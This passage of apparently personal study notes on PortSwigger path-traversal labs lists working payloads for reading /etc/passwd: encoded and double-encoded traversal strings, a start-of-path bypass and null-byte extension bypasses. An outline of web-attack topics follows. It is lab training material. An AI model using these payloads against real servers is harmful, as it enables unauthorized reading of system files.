    filename=%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64   (NO, complete URL encode)

    filename=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66etc/passwd    (OK, double URL encode)
    ```

5. #### **File path traversal, validation of start of path**

    ```plaintext
    https://<lab_url>/product   GET   (productId=5)
    https://<lab_url>/image     GET   (filename=50.jpg)

    filename=/var/www/images/../../../etc/passwd
    ```

6. #### **File path traversal, validation of file extension with null byte bypass**

    ```plaintext
    https://<lab_url>/product   GET   (productId=6)
    https://<lab_url>/image     GET   (filename=60.jpg)

    v1: filename=../../../etc/passwd%00.jpg
    v2: filename=../../../etc/passwd%00.png
    ```

[directory_traversal]: https://portswigger.net/web-security/file-path-traversal

---

<!--
## **Command Injection**

## **Business Logic Vulnerabilities**

## **Information Disclosure**

## **Access Control**

## **File Upload Vulnerabilities**

## **Server-Side Request Forgery (SSRF)**

## **XXE Injection**

<br>

# Client-Side Topics

## **Cross-Site Scripting (XSS)**

## **Cross-Site Request Forgery (CSRF)**

## **Cross-Origin Resource Sharing (CORS)**

## **Clickjacking**

## **DOM-Based Vulnerabilities**

## **WebSockets**

<br>

# Advanced Topics

## **Insecure Deserialization**

## **Server-Side Template Injection**

## **Web Cache Poisoning**

## **HTTP Host Header Attacks**

## **HTTP Request Smuggling**

## **OAuth Authentication**

-->
